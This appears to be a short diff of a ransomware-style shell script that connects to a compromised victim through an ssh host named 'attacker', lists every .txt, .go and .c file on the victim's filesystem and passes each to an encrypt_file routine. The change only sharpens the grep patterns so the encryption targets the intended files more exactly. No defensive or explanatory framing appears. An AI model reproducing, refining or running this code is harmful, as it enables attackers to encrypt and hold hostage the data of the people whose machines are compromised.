@@ -57,7 +57,7 @@ sleep 5 # let the victim connect
 
 # Encrypt all text files
 (
-    output=$(ssh attacker "byossh compromised 'find / | grep .txt'" | sed '1d')
+    output=$(ssh attacker "byossh compromised 'find / | grep .txt$'" | sed '1d')
     for file in $output; do
         encrypt_file $file
     done
@@ -73,7 +73,7 @@ sleep 5 # let the victim connect
 
 # Encrypt all go files
 (
-    output=$(ssh attacker "byossh compromised 'find / | grep .go'" | sed '1d')
+    output=$(ssh attacker "byossh compromised 'find / | grep .go$'" | sed '1d')
     for file in $output; do
         encrypt_file $file
     done
@@ -81,7 +81,7 @@ sleep 5 # let the victim connect
 
 # Encrypt all c files
 (
-    output=$(ssh attacker "byossh compromised 'find / | grep .c'" | sed '1d')
+    output=$(ssh attacker "byossh compromised 'find / | grep \'\\.c$\''" | sed '1d')
     for file in $output; do
         encrypt_file $file
     done
